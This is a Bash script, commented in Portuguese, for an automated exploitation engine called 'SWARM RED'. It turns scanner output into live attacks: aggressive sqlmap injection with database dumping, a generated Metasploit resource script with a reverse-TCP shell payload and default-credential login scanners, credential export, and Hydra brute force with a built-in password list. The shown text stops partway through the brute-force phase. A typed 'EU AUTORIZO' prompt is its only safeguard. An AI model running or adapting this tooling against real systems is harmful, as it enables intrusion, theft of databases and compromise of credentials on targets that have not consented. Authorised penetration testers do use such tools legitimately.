#!/usr/bin/env bash
# ═══════════════════════════════════════════════════════════════════════════════
#  SWARM RED — Automated Exploitation Engine
# ═══════════════════════════════════════════════════════════════════════════════
#  Consome resultados do SWARM (scan) e executa exploração automatizada.
#
#  Pipeline:   SWARM (recon + vuln scan) → SWARM RED (exploitation)
#
#  USO EXCLUSIVO EM AMBIENTES AUTORIZADOS E CONTROLADOS.
#  Requer: Rules of Engagement (RoE) assinado + janela de teste aprovada.
#
#  Uso:
#    bash swarm_red.sh -d <scan_dir>                    # Dir do SWARM
#    bash swarm_red.sh -d <scan_dir> -p <profile>       # Com perfil
#    bash swarm_red.sh -d <scan_dir> --dry-run           # Simular apenas
#    bash swarm_red.sh -t <target> --standalone           # Sem SWARM prévio
#
#  Perfis:     staging | lab | production
#  Operadores: Red Team (com RoE documentado)
# ═══════════════════════════════════════════════════════════════════════════════
set -uo pipefail

# ═══════════════════════════════════════════════════════════════════════════════
#  CONSTANTES E CORES
# ═══════════════════════════════════════════════════════════════════════════════
readonly VERSION="1.0.0"
readonly SCRIPT_NAME="SWARM RED"
readonly SCRIPT_START=$(date +%s)

RED='\033[0;31m'; GRN='\033[0;32m'; YLW='\033[1;33m'; CYN='\033[0;36m'
MAG='\033[0;35m'; BLD='\033[1m'; DIM='\033[2m'; RST='\033[0m'

# ═══════════════════════════════════════════════════════════════════════════════
#  PERFIS DE EXECUÇÃO
# ═══════════════════════════════════════════════════════════════════════════════
# Cada perfil define os limites de agressividade.
#
#   staging     → Agressividade máxima. SQLi dump, Metasploit full, brute force.
#   lab         → Sem restrições. Ambiente descartável.
#   production  → Mínimo impacto. Apenas confirm de vuln, sem dump, sem brute.
# ═══════════════════════════════════════════════════════════════════════════════

declare -A PROFILE_SQLMAP_LEVEL PROFILE_SQLMAP_RISK PROFILE_SQLMAP_THREADS
declare -A PROFILE_SQLMAP_DUMP PROFILE_MSF_PAYLOAD PROFILE_BRUTE_FORCE
declare -A PROFILE_NIKTO_ENABLED PROFILE_MAX_EXPLOITS PROFILE_DESCRIPTION

PROFILE_DESCRIPTION[staging]="Staging/Homolog — agressividade alta, dump habilitado"
PROFILE_DESCRIPTION[lab]="Lab/Sandbox — sem restrições, ambiente descartável"
PROFILE_DESCRIPTION[production]="Produção (janela aprovada) — mínimo impacto, só confirmação"

# sqlmap
PROFILE_SQLMAP_LEVEL[staging]=3;   PROFILE_SQLMAP_LEVEL[lab]=5;    PROFILE_SQLMAP_LEVEL[production]=1
PROFILE_SQLMAP_RISK[staging]=2;    PROFILE_SQLMAP_RISK[lab]=3;     PROFILE_SQLMAP_RISK[production]=1
PROFILE_SQLMAP_THREADS[staging]=5; PROFILE_SQLMAP_THREADS[lab]=10; PROFILE_SQLMAP_THREADS[production]=1
PROFILE_SQLMAP_DUMP[staging]=true; PROFILE_SQLMAP_DUMP[lab]=true;  PROFILE_SQLMAP_DUMP[production]=false

# Metasploit
PROFILE_MSF_PAYLOAD[staging]="generic/shell_reverse_tcp"
PROFILE_MSF_PAYLOAD[lab]="generic/shell_reverse_tcp"
PROFILE_MSF_PAYLOAD[production]="NONE"

# Brute force (hydra)
PROFILE_BRUTE_FORCE[staging]=true;  PROFILE_BRUTE_FORCE[lab]=true;  PROFILE_BRUTE_FORCE[production]=false

# Nikto
PROFILE_NIKTO_ENABLED[staging]=true; PROFILE_NIKTO_ENABLED[lab]=true; PROFILE_NIKTO_ENABLED[production]=false

# Limites
PROFILE_MAX_EXPLOITS[staging]=50;  PROFILE_MAX_EXPLOITS[lab]=999;  PROFILE_MAX_EXPLOITS[production]=10

# ═══════════════════════════════════════════════════════════════════════════════
#  VARIÁVEIS GLOBAIS
# ═══════════════════════════════════════════════════════════════════════════════
SCAN_DIR=""
TARGET=""
PROFILE="staging"
DRY_RUN=false
STANDALONE=false
OUTDIR=""
LOGFILE=""
LHOST=""
LPORT="4444"
ROE_CONFIRMED=false
VENV_PYTHON="$HOME/.swarm-red-venv/bin/python3"

# Contadores
TOTAL_EXPLOITS=0
SUCCESSFUL_EXPLOITS=0
FAILED_EXPLOITS=0

# ═══════════════════════════════════════════════════════════════════════════════
#  FUNÇÕES UTILITÁRIAS
# ═══════════════════════════════════════════════════════════════════════════════
banner() {
    echo -e "${RED}"
    cat << 'EOF'
   _____ _       _____    ____  __  ___   ____  __________
  / ___/| |     / /   |  / __ \/  |/  /  / __ \/ ____/ __ \
  \__ \ | | /| / / /| | / /_/ / /|_/ /  / /_/ / __/ / / / /
 ___/ / | |/ |/ / ___ |/ _, _/ /  / /  / _, _/ /___/ /_/ /
/____/  |__/|__/_/  |_/_/ |_/_/  /_/  /_/ |_/_____/_____/
EOF
    echo -e "${RST}"
    echo -e "  ${DIM}v${VERSION} — Automated Exploitation Engine${RST}"
    echo -e "  ${RED}⚠  USO EXCLUSIVO EM AMBIENTES AUTORIZADOS${RST}"
    echo ""
}

info()    { echo -e "  ${GRN}[✓]${RST} $*" | tee -a "$LOGFILE"; }
warn()    { echo -e "  ${YLW}[!]${RST} $*" | tee -a "$LOGFILE"; }
fail()    { echo -e "  ${RED}[✗]${RST} $*" | tee -a "$LOGFILE"; }
phase()   { echo -e "\n${CYN}════════════════════════════════════════════════════════════════${RST}" | tee -a "$LOGFILE"
            echo -e "  ${CYN}$*${RST}" | tee -a "$LOGFILE"
            echo -e "${CYN}════════════════════════════════════════════════════════════════${RST}" | tee -a "$LOGFILE"; }
has()     { command -v "$1" &>/dev/null; }
ts()      { date '+%Y-%m-%d %H:%M:%S'; }

log_cmd() {
    # Loga o comando no activity log antes de executar
    echo "[$(ts)] CMD: $*" >> "$LOGFILE"
}

elapsed() {
    local end=$(date +%s)
    local dur=$((end - SCRIPT_START))
    printf '%02d:%02d:%02d' $((dur/3600)) $(((dur%3600)/60)) $((dur%60))
}

# ═══════════════════════════════════════════════════════════════════════════════
#  PATH — RESOLVER FERRAMENTAS EM SUBSHELL
# ═══════════════════════════════════════════════════════════════════════════════
setup_path() {
    local extra_paths=(
        "$HOME/go/bin"
        "/root/go/bin"
        "$HOME/.local/bin"
        "/opt/metasploit-framework/bin"
        "/usr/share/metasploit-framework"
        "/opt/sqlmap"
    )
    for p in "${extra_paths[@]}"; do
        [ -d "$p" ] && [[ ":$PATH:" != *":$p:"* ]] && export PATH="$p:$PATH"
    done
}

# ═══════════════════════════════════════════════════════════════════════════════
#  VALIDAÇÃO DE FERRAMENTAS
# ═══════════════════════════════════════════════════════════════════════════════
validate_tools() {
    phase "VALIDAÇÃO DE FERRAMENTAS"

    local required=(bash python3 curl)
    local optional=(msfconsole sqlmap nmap hydra nikto searchsploit jq)
    local missing_req=0

    for tool in "${required[@]}"; do
        if has "$tool"; then
            info "$tool encontrado → $(which "$tool")"
        else
            fail "$tool NÃO ENCONTRADO (obrigatório)"
            ((missing_req++))
        fi
    done

    for tool in "${optional[@]}"; do
        if has "$tool"; then
            info "$tool encontrado → $(which "$tool")"
        else
            warn "$tool não encontrado (funcionalidade será desabilitada)"
        fi
    done

    # Python venv
    if [ -f "$VENV_PYTHON" ]; then
        info "Python venv → $VENV_PYTHON"
    else
        warn "Venv não encontrado — usando python3 do sistema"
        VENV_PYTHON="python3"
    fi

    if [ "$missing_req" -gt 0 ]; then
        fail "Ferramentas obrigatórias faltando. Execute: bash setup.sh"
        exit 1
    fi
}

# ═══════════════════════════════════════════════════════════════════════════════
#  CONFIRMAÇÃO ROE (RULES OF ENGAGEMENT)
# ═══════════════════════════════════════════════════════════════════════════════
confirm_roe() {
    phase "CONFIRMAÇÃO DE AUTORIZAÇÃO"

    echo -e "  ${RED}${BLD}╔══════════════════════════════════════════════════════════╗${RST}"
    echo -e "  ${RED}${BLD}║              ⚠  AVISO DE AUTORIZAÇÃO  ⚠                ║${RST}"
    echo -e "  ${RED}${BLD}╠══════════════════════════════════════════════════════════╣${RST}"
    echo -e "  ${RED}${BLD}║                                                        ║${RST}"
    echo -e "  ${RED}${BLD}║  Este script executa EXPLORAÇÃO ATIVA incluindo:       ║${RST}"
    echo -e "  ${RED}${BLD}║  • SQL Injection (sqlmap modo agressivo)               ║${RST}"
    echo -e "  ${RED}${BLD}║  • Exploits Metasploit com payloads ativos             ║${RST}"
    echo -e "  ${RED}${BLD}║  • Brute force de credenciais (hydra)                  ║${RST}"
    echo -e "  ${RED}${BLD}║  • Scan ativo de vulnerabilidades (nikto)              ║${RST}"
    echo -e "  ${RED}${BLD}║                                                        ║${RST}"
    echo -e "  ${RED}${BLD}║  USO SEM AUTORIZAÇÃO É CRIME (Art. 154-A CP).         ║${RST}"
    echo -e "  ${RED}${BLD}║                                                        ║${RST}"
    echo -e "  ${RED}${BLD}╚══════════════════════════════════════════════════════════╝${RST}"
    echo ""
    echo -e "  ${YLW}Perfil:${RST}     ${PROFILE} — ${PROFILE_DESCRIPTION[$PROFILE]}"
    echo -e "  ${YLW}Alvo:${RST}       ${TARGET:-$SCAN_DIR}"
    echo -e "  ${YLW}Dry-run:${RST}    ${DRY_RUN}"
    echo ""

    if [ "$DRY_RUN" = true ]; then
        warn "Modo DRY-RUN ativo — nenhum exploit será executado de fato"
        ROE_CONFIRMED=true
        return 0
    fi

    echo -e "  ${BLD}Confirme digitando exatamente:${RST} ${RED}EU AUTORIZO${RST}"
    read -rp "  > " confirmation

    if [ "$confirmation" = "EU AUTORIZO" ]; then
        ROE_CONFIRMED=true
        info "Autorização confirmada por: $(whoami)@$(hostname) em $(ts)"
        echo "[$(ts)] ROE CONFIRMADO por $(whoami)@$(hostname)" >> "$LOGFILE"
    else
        fail "Autorização não confirmada. Abortando."
        exit 1
    fi
}

# ═══════════════════════════════════════════════════════════════════════════════
#  PARSER DE RESULTADOS DO SWARM
# ═══════════════════════════════════════════════════════════════════════════════
parse_swarm_results() {
    phase "FASE 1/6: INGESTÃO DE RESULTADOS SWARM"

    # Criar OUTDIR temporário para ingestão (será renomeado no main)
    _TEMP_OUTDIR=$(mktemp -d "./swarm_red_tmp_XXXXXX")
    OUTDIR="$_TEMP_OUTDIR"
    mkdir -p "$OUTDIR"/{sqlmap,metasploit,hydra,nikto,searchsploit}
    echo "status|target|tool|detail" > "$OUTDIR/exploits_confirmed.csv"
    echo "status|target|tool|detail" > "$OUTDIR/exploits_attempted.csv"

    if [ "$STANDALONE" = true ]; then
        warn "Modo standalone — sem resultados SWARM prévios"
        info "Alvo: $TARGET"
        return 0
    fi

    if [ ! -d "$SCAN_DIR" ]; then
        fail "Diretório do SWARM não encontrado: $SCAN_DIR"
        exit 1
    fi

    local raw_dir="$SCAN_DIR/raw"
    if [ ! -d "$raw_dir" ]; then
        # Tentar encontrar subdir raw dentro do scan dir
        raw_dir=$(find "$SCAN_DIR" -name "raw" -type d 2>/dev/null | head -1)
        if [ -z "$raw_dir" ]; then
            fail "Diretório raw/ não encontrado em $SCAN_DIR"
            exit 1
        fi
    fi

    info "Diretório SWARM: $SCAN_DIR"
    info "Raw data: $raw_dir"

    # ── Extrair TARGET do SWARM ──
    if [ -z "$TARGET" ]; then
        # Tentar extrair do nome do diretório (scan_DOMAIN_DATE)
        TARGET=$(basename "$SCAN_DIR" | sed -E 's/^scan_//;s/_[0-9]{8}_[0-9]{6}$//')
        if [ -z "$TARGET" ] || [ "$TARGET" = "$(basename "$SCAN_DIR")" ]; then
            fail "Não consegui extrair o alvo do diretório. Use -t <target>"
            exit 1
        fi
    fi
    info "Alvo: $TARGET"

    # ── Parse Nuclei results ──
    local nuclei_json="$raw_dir/nuclei.json"
    local nuclei_jsonl="$raw_dir/nuclei_results.jsonl"
    local nuclei_file=""

    if [ -f "$nuclei_json" ]; then
        nuclei_file="$nuclei_json"
    elif [ -f "$nuclei_jsonl" ]; then
        nuclei_file="$nuclei_jsonl"
    fi

    if [ -n "$nuclei_file" ] && [ -s "$nuclei_file" ]; then
        local nuclei_count
        nuclei_count=$(wc -l < "$nuclei_file")
        info "Nuclei findings: $nuclei_count"
        cp "$nuclei_file" "$OUTDIR/input_nuclei.jsonl"

        # Extrair CVEs, URLs com parâmetros, e todas URLs (Python — sem depender de jq)
        $VENV_PYTHON << PYPARSE - "$nuclei_file" "$OUTDIR"
import sys, json

nuclei_file = sys.argv[1]
outdir = sys.argv[2]

cves = set()
urls_params = set()
all_urls = set()

with open(nuclei_file) as f:
    for line in f:
        line = line.strip()
        if not line:
            continue
        try:
            obj = json.loads(line)
        except json.JSONDecodeError:
            continue
        # CVEs
        classification = obj.get("info", {}).get("classification", {})
        cve_list = classification.get("cve") or classification.get("cve-id") or []
        if isinstance(cve_list, list):
            for c in cve_list:
                if c:
                    cves.add(c)
        elif isinstance(cve_list, str) and cve_list:
            cves.add(cve_list)
        # URLs
        url = obj.get("matched-at") or obj.get("host") or ""
        if url:
            all_urls.add(url)
            if "?" in url:
                urls_params.add(url)

with open(f"{outdir}/cves_found.txt", "w") as f:
    f.write("\n".join(sorted(cves)) + ("\n" if cves else ""))
with open(f"{outdir}/urls_with_params.txt", "w") as f:
    f.write("\n".join(sorted(urls_params)) + ("\n" if urls_params else ""))
with open(f"{outdir}/all_target_urls.txt", "w") as f:
    f.write("\n".join(sorted(all_urls)) + ("\n" if all_urls else ""))

print(f"CVEs:{len(cves)}|URLs_params:{len(urls_params)}|URLs_total:{len(all_urls)}")
PYPARSE

        local cve_count
        cve_count=$(wc -l < "$OUTDIR/cves_found.txt" 2>/dev/null || echo "0")
        info "CVEs extraídos: $cve_count"
    else
        warn "Sem resultados Nuclei — módulo SQLi rodará em modo discovery"
    fi

    # ── Parse Nmap results ──
    local nmap_file="$raw_dir/nmap.txt"
    if [ -f "$nmap_file" ] && [ -s "$nmap_file" ]; then
        info "Nmap results encontrados"
        cp "$nmap_file" "$OUTDIR/input_nmap.txt"

        # Extrair portas abertas e serviços
        grep -E '^[0-9]+/(tcp|udp)' "$nmap_file" 2>/dev/null \
            | awk '{print $1, $3, $4}' > "$OUTDIR/open_services.txt" || true
        local svc_count
        svc_count=$(wc -l < "$OUTDIR/open_services.txt" 2>/dev/null || echo "0")
        info "Serviços abertos: $svc_count"
    fi

    # ── Parse ZAP results ──
    local zap_json="$raw_dir/zap_alerts.json"
    if [ -f "$zap_json" ] && [ -s "$zap_json" ]; then
        info "ZAP alerts encontrados"
        cp "$zap_json" "$OUTDIR/input_zap.json"

        # Extrair alertas de SQLi e High/Critical do ZAP (Python)
        $VENV_PYTHON << ZAPPARSE - "$zap_json" "$OUTDIR"
import sys, json, re

zap_file = sys.argv[1]
outdir = sys.argv[2]

try:
    with open(zap_file) as f:
        alerts = json.load(f)
except (json.JSONDecodeError, FileNotFoundError):
    alerts = []

sqli_urls = set()
high_crit = []

for a in alerts:
    alert_name = a.get("alert", "")
    url = a.get("url", "")
    risk = a.get("risk", "")
    if re.search(r"sql|injection", alert_name, re.IGNORECASE):
        if url:
            sqli_urls.add(url)
    if risk in ("High", "Critical"):
        high_crit.append(f"{risk}|{alert_name}|{url}")

with open(f"{outdir}/zap_sqli_urls.txt", "w") as f:
    f.write("\n".join(sorted(sqli_urls)) + ("\n" if sqli_urls else ""))
with open(f"{outdir}/zap_high_crit.txt", "w") as f:
    f.write("\n".join(high_crit) + ("\n" if high_crit else ""))
ZAPPARSE
    fi

    # ── Parse testssl results ──
    local testssl_json="$raw_dir/testssl.json"
    if [ -f "$testssl_json" ] && [ -s "$testssl_json" ]; then
        info "testssl results encontrados"
        cp "$testssl_json" "$OUTDIR/input_testssl.json"
    fi

    # ── Parse httpx results ──
    local httpx_file="$raw_dir/httpx_results.txt"
    local httpx_jsonl="$raw_dir/httpx.jsonl"
    if [ -f "$httpx_jsonl" ] && [ -s "$httpx_jsonl" ]; then
        info "httpx results encontrados"
        cp "$httpx_jsonl" "$OUTDIR/input_httpx.jsonl"
    elif [ -f "$httpx_file" ] && [ -s "$httpx_file" ]; then
        cp "$httpx_file" "$OUTDIR/input_httpx.txt"
    fi

    info "Ingestão completa"
}

# ═══════════════════════════════════════════════════════════════════════════════
#  FASE 2: SQL INJECTION (sqlmap)
# ═══════════════════════════════════════════════════════════════════════════════
run_sqli_phase() {
    phase "FASE 2/6: SQL INJECTION (sqlmap)"

    # Consolidar URLs candidatas para SQLi (sempre, mesmo sem sqlmap)
    mkdir -p "$OUTDIR/sqlmap"
    local sqli_urls="$OUTDIR/sqli_targets.txt"
    cat "$OUTDIR/urls_with_params.txt" \
        "$OUTDIR/zap_sqli_urls.txt" \
        2>/dev/null | sort -u > "$sqli_urls" || true

    local sqli_count=0
    [ -s "$sqli_urls" ] && sqli_count=$(wc -l < "$sqli_urls")
    info "URLs candidatas SQLi consolidadas: $sqli_count"

    if ! has sqlmap; then
        warn "sqlmap não encontrado — fase desabilitada"
        return 0
    fi

    local level="${PROFILE_SQLMAP_LEVEL[$PROFILE]}"
    local risk="${PROFILE_SQLMAP_RISK[$PROFILE]}"
    local threads="${PROFILE_SQLMAP_THREADS[$PROFILE]}"
    local dump="${PROFILE_SQLMAP_DUMP[$PROFILE]}"

    info "Perfil: level=$level risk=$risk threads=$threads dump=$dump"

    # Se não há URLs com parâmetros, tentar crawl rápido
    if [ ! -s "$sqli_urls" ]; then
        warn "Sem URLs com parâmetros — executando sqlmap em modo crawl"

        local crawl_target="https://${TARGET}"
        if [ "$DRY_RUN" = true ]; then
            info "[DRY-RUN] sqlmap -u $crawl_target --crawl=3 --batch --level=$level --risk=$risk"
            return 0
        fi

        log_cmd "sqlmap -u $crawl_target --crawl=3 --forms --batch --level=$level --risk=$risk --threads=$threads --output-dir=$OUTDIR/sqlmap --random-agent"

        timeout 600 sqlmap \
            -u "$crawl_target" \
            --crawl=3 \
            --forms \
            --batch \
            --level="$level" \
            --risk="$risk" \
            --threads="$threads" \
            --output-dir="$OUTDIR/sqlmap" \
            --random-agent \
            --flush-session \
            --technique=BEUSTQ \
            2>&1 | tee "$OUTDIR/sqlmap/crawl_output.log" || true

        _parse_sqlmap_results "$OUTDIR/sqlmap"
        return 0
    fi

    local url_count
    url_count=$(wc -l < "$sqli_urls")
    info "$url_count URL(s) candidata(s) para teste SQLi"

    local max="${PROFILE_MAX_EXPLOITS[$PROFILE]}"
    local tested=0

    while IFS= read -r url; do
        [ -z "$url" ] && continue
        ((tested++))
        [ "$tested" -gt "$max" ] && { warn "Limite de $max testes atingido"; break; }

        local safe_name
        safe_name=$(echo "$url" | md5sum | cut -c1-8)

        info "[$tested/$url_count] Testando: $url"

        if [ "$DRY_RUN" = true ]; then
            info "[DRY-RUN] sqlmap -u '$url' --batch --level=$level --risk=$risk --threads=$threads"
            continue
        fi

        local sqlmap_args=(
            -u "$url"
            --batch
            --level="$level"
            --risk="$risk"
            --threads="$threads"
            --output-dir="$OUTDIR/sqlmap/$safe_name"
            --random-agent
            --flush-session
            --technique=BEUSTQ
            --tamper=space2comment,between
        )

        # Dump apenas em staging/lab
        if [ "$dump" = true ]; then
            sqlmap_args+=(--dump --dump-format=CSV)
        else
            sqlmap_args+=(--banner --current-db --current-user)
        fi

        log_cmd "sqlmap ${sqlmap_args[*]}"

        timeout 300 sqlmap "${sqlmap_args[@]}" \
            2>&1 | tee "$OUTDIR/sqlmap/${safe_name}_output.log" || true

        # Detectar sucesso
        if grep -qiE "(is vulnerable|injectable|payload|fetched)" "$OUTDIR/sqlmap/${safe_name}_output.log" 2>/dev/null; then
            info "  ${RED}⚡ VULNERÁVEL: $url${RST}"
            echo "VULNERABLE|$url|sqlmap|level=$level,risk=$risk" >> "$OUTDIR/exploits_confirmed.csv"
            ((SUCCESSFUL_EXPLOITS++))
        else
            info "  Não vulnerável ou protegido"
            echo "NOT_VULNERABLE|$url|sqlmap|level=$level,risk=$risk" >> "$OUTDIR/exploits_attempted.csv"
        fi
        ((TOTAL_EXPLOITS++))

    done < "$sqli_urls"

    _parse_sqlmap_results "$OUTDIR/sqlmap"
    info "SQLi fase completa: $tested URL(s) testada(s)"
}

_parse_sqlmap_results() {
    local dir="$1"
    # Consolidar achados do sqlmap
    find "$dir" -name "*.csv" -o -name "log" 2>/dev/null | while read -r f; do
        if grep -qiE "vulnerable|injectable" "$f" 2>/dev/null; then
            info "  Evidência SQLi: $f"
        fi
    done || true
}

# ═══════════════════════════════════════════════════════════════════════════════
#  FASE 3: METASPLOIT EXPLOITATION
# ═══════════════════════════════════════════════════════════════════════════════
run_msf_phase() {
    phase "FASE 3/6: METASPLOIT EXPLOITATION"

    if ! has msfconsole; then
        warn "Metasploit não encontrado — fase desabilitada"
        return 0
    fi

    if [ "$PROFILE" = "production" ]; then
        warn "Perfil production — Metasploit exploitation desabilitado"
        warn "Apenas auxiliary/scanner modules serão usados"
    fi

    mkdir -p "$OUTDIR/metasploit"

    # ── Detectar LHOST ──
    if [ -z "$LHOST" ]; then
        # Tentar detectar IP automaticamente
        LHOST=$(ip route get 1 2>/dev/null | awk '{print $7; exit}')
        if [ -z "$LHOST" ]; then
            LHOST=$(hostname -I 2>/dev/null | awk '{print $1}')
        fi
        if [ -z "$LHOST" ]; then
            warn "Não consegui detectar LHOST — defina com --lhost"
            LHOST="127.0.0.1"
        fi
    fi
    info "LHOST: $LHOST | LPORT: $LPORT"

    # ── Gerar Resource Script do Metasploit ──
    local rc_file="$OUTDIR/metasploit/swarm_red.rc"
    _generate_msf_rc "$rc_file"

    if [ "$DRY_RUN" = true ]; then
        info "[DRY-RUN] Resource script gerado: $rc_file"
        info "[DRY-RUN] Executaria: msfconsole -q -r $rc_file"
        return 0
    fi

    log_cmd "msfconsole -q -r $rc_file"
    info "Executando Metasploit com resource script..."

    timeout 1800 msfconsole -q -r "$rc_file" \
        2>&1 | tee "$OUTDIR/metasploit/msf_output.log" || true

    # Parse resultados
    _parse_msf_results

    info "Metasploit fase completa"
}

_generate_msf_rc() {
    local rc_file="$1"
    local target_ip

    # Resolver IP do target
    target_ip=$(dig +short "$TARGET" 2>/dev/null | grep -E '^[0-9]+\.' | head -1)
    if [ -z "$target_ip" ]; then
        target_ip=$(getent hosts "$TARGET" 2>/dev/null | awk '{print $1}' | head -1)
    fi
    [ -z "$target_ip" ] && target_ip="$TARGET"

    info "Target IP: $target_ip"

    cat > "$rc_file" << RCEOF
# ═══════════════════════════════════════════════════════
#  SWARM RED — Metasploit Resource Script
#  Gerado: $(ts)
#  Target: $TARGET ($target_ip)
#  Profile: $PROFILE
# ═══════════════════════════════════════════════════════
setg RHOSTS $target_ip
setg RHOST $target_ip
setg LHOST $LHOST
setg LPORT $LPORT
setg VERBOSE true

# ── Workspace ──
workspace -a swarm_red_$(date +%Y%m%d)

# ── DB Import (se nmap XML disponível) ──
RCEOF

    # Importar nmap se disponível
    local nmap_xml
    nmap_xml=$(find "$OUTDIR" "$SCAN_DIR" -name "*.xml" -path "*/nmap*" 2>/dev/null | head -1)
    if [ -n "$nmap_xml" ]; then
        echo "db_import $nmap_xml" >> "$rc_file"
        info "Nmap XML será importado: $nmap_xml"
    fi

    cat >> "$rc_file" << 'RCEOF'

# ═══════════════════════════════════════════════════════
#  MÓDULO 1: Scanner de serviços HTTP
# ═══════════════════════════════════════════════════════
echo "========== HTTP SERVICE SCANNER =========="
use auxiliary/scanner/http/http_version
run
back

# ═══════════════════════════════════════════════════════
#  MÓDULO 2: HTTP Header Analysis
# ═══════════════════════════════════════════════════════
echo "========== HTTP HEADERS =========="
use auxiliary/scanner/http/http_header
run
back

# ═══════════════════════════════════════════════════════
#  MÓDULO 3: SSL/TLS Analysis
# ═══════════════════════════════════════════════════════
echo "========== SSL/TLS SCANNER =========="
use auxiliary/scanner/http/ssl_version
set RPORT 443
run
back

# ═══════════════════════════════════════════════════════
#  MÓDULO 4: Directory Brute Force
# ═══════════════════════════════════════════════════════
echo "========== DIR SCANNER =========="
use auxiliary/scanner/http/dir_scanner
set RPORT 443
set SSL true
set DICTIONARY /usr/share/metasploit-framework/data/wordlists/directory.txt
run
back

# ═══════════════════════════════════════════════════════
#  MÓDULO 5: Default Credentials
# ═══════════════════════════════════════════════════════
echo "========== TOMCAT MANAGER =========="
use auxiliary/scanner/http/tomcat_mgr_login
set RPORT 8080
set STOP_ON_SUCCESS true
run
back

echo "========== JENKINS =========="
use auxiliary/scanner/http/jenkins_login
set RPORT 8080
run
back
RCEOF

    # ── CVE-based exploits (apenas staging/lab) ──
    if [ "$PROFILE" != "production" ] && [ -f "$OUTDIR/cves_found.txt" ] && [ -s "$OUTDIR/cves_found.txt" ]; then
        echo "" >> "$rc_file"
        echo "# ═══════════════════════════════════════════════════════" >> "$rc_file"
        echo "#  MÓDULO 6: CVE-based Exploits (auto-generated)" >> "$rc_file"
        echo "# ═══════════════════════════════════════════════════════" >> "$rc_file"

        while IFS= read -r cve; do
            [ -z "$cve" ] && continue
            cat >> "$rc_file" << RCEOF

echo "========== Searching: $cve =========="
search cve:$cve type:exploit
RCEOF
        done < "$OUTDIR/cves_found.txt"
    fi

    # ── Portas específicas baseadas no nmap ──
    if [ -f "$OUTDIR/open_services.txt" ] && [ -s "$OUTDIR/open_services.txt" ]; then
        echo "" >> "$rc_file"
        echo "# ═══════════════════════════════════════════════════════" >> "$rc_file"
        echo "#  MÓDULO 7: Service-specific scanners" >> "$rc_file"
        echo "# ═══════════════════════════════════════════════════════" >> "$rc_file"

        # SSH
        if grep -q "22/tcp" "$OUTDIR/open_services.txt" 2>/dev/null; then
            cat >> "$rc_file" << 'RCEOF'

echo "========== SSH ENUMUSERS =========="
use auxiliary/scanner/ssh/ssh_enumusers
set RPORT 22
set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt
set THREADS 5
run
back
RCEOF
        fi

        # SMB
        if grep -q "445/tcp" "$OUTDIR/open_services.txt" 2>/dev/null; then
            cat >> "$rc_file" << 'RCEOF'

echo "========== SMB VERSION =========="
use auxiliary/scanner/smb/smb_version
run
back

echo "========== SMB ENUM SHARES =========="
use auxiliary/scanner/smb/smb_enumshares
run
back
RCEOF
        fi

        # MySQL
        if grep -qE "3306/tcp" "$OUTDIR/open_services.txt" 2>/dev/null; then
            cat >> "$rc_file" << 'RCEOF'

echo "========== MYSQL LOGIN =========="
use auxiliary/scanner/mysql/mysql_login
set RPORT 3306
set BLANK_PASSWORDS true
set USERNAME root
run
back
RCEOF
        fi

        # PostgreSQL
        if grep -qE "5432/tcp" "$OUTDIR/open_services.txt" 2>/dev/null; then
            cat >> "$rc_file" << 'RCEOF'

echo "========== POSTGRES LOGIN =========="
use auxiliary/scanner/postgres/postgres_login
set RPORT 5432
set USERNAME postgres
run
back
RCEOF
        fi

        # RDP
        if grep -qE "3389/tcp" "$OUTDIR/open_services.txt" 2>/dev/null; then
            cat >> "$rc_file" << 'RCEOF'

echo "========== RDP SCANNER =========="
use auxiliary/scanner/rdp/rdp_scanner
run
back
RCEOF
        fi
    fi

    # Finalizar
    cat >> "$rc_file" << RCEOF

# ═══════════════════════════════════════════════════════
#  EXPORT E CLEANUP
# ═══════════════════════════════════════════════════════
echo "========== EXPORTING RESULTS =========="
hosts -o $OUTDIR/metasploit/hosts.csv
services -o $OUTDIR/metasploit/services.csv
vulns -o $OUTDIR/metasploit/vulns.csv
creds -o $OUTDIR/metasploit/creds.csv
echo "========== SWARM RED MSF COMPLETE =========="
exit
RCEOF

    info "Resource script gerado: $rc_file"
}

_parse_msf_results() {
    local msf_log="$OUTDIR/metasploit/msf_output.log"
    if [ -f "$msf_log" ]; then
        # Contar sessões abertas
        local sessions
        sessions=$(grep -c "session.*opened" "$msf_log" 2>/dev/null || echo "0")
        if [ "$sessions" -gt 0 ]; then
            info "  ${RED}⚡ SESSÕES ABERTAS: $sessions${RST}"
            ((SUCCESSFUL_EXPLOITS += sessions))
        fi

        # Contar credenciais encontradas
        local creds
        creds=$(grep -ciE "(login|password|credential|found)" "$msf_log" 2>/dev/null || echo "0")
        if [ "$creds" -gt 0 ]; then
            info "  Credenciais/logins detectados: ~$creds referências"
        fi

        ((TOTAL_EXPLOITS++))
    fi
}

# ═══════════════════════════════════════════════════════════════════════════════
#  FASE 4: BRUTE FORCE (Hydra)
# ═══════════════════════════════════════════════════════════════════════════════
run_brute_phase() {
    phase "FASE 4/6: BRUTE FORCE (Hydra)"

    if [ "${PROFILE_BRUTE_FORCE[$PROFILE]}" != "true" ]; then
        warn "Brute force desabilitado no perfil $PROFILE"
        return 0
    fi

    if ! has hydra; then
        warn "hydra não encontrado — fase desabilitada"
        return 0
    fi

    mkdir -p "$OUTDIR/hydra"

    if [ ! -f "$OUTDIR/open_services.txt" ] || [ ! -s "$OUTDIR/open_services.txt" ]; then
        warn "Sem serviços detectados — pulando brute force"
        return 0
    fi

    local target_ip
    target_ip=$(dig +short "$TARGET" 2>/dev/null | grep -E '^[0-9]+\.' | head -1)
    [ -z "$target_ip" ] && target_ip="$TARGET"

    # Wordlists padrão
    local userlist="/usr/share/metasploit-framework/data/wordlists/common_users.txt"
    local passlist="/usr/share/metasploit-framework/data/wordlists/common_passwords.txt"

    # Fallback para wordlists menores se não existir
    [ ! -f "$userlist" ] && userlist="/usr/share/wordlists/fasttrack.txt"
    [ ! -f "$passlist" ] && passlist="/usr/share/wordlists/fasttrack.txt"

    if [ ! -f "$userlist" ] || [ ! -f "$passlist" ]; then
        warn "Wordlists não encontradas — criando lista mínima"
        echo -e "admin\nroot\nuser\ntest\nmanager\ntomcat\njenkins\npostgres\nmysql" > "$OUTDIR/hydra/users.txt"
        echo -e "admin\npassword\n123456\nroot\ntest\nchangeme\nPassword1\nadmin123\ndefault" > "$OUTDIR/hydra/passwords.txt"
        userlist="$OUTDIR/hydra/users.txt"
        passlist="$OUTDIR/hydra/passwords.txt"
    fi

    # Testar cada serviço detectado
    local services_to_test=()

    grep -q "22/tcp" "$OUTDIR/open_services.txt" 2>/dev/null && services_to_test+=("ssh:22")
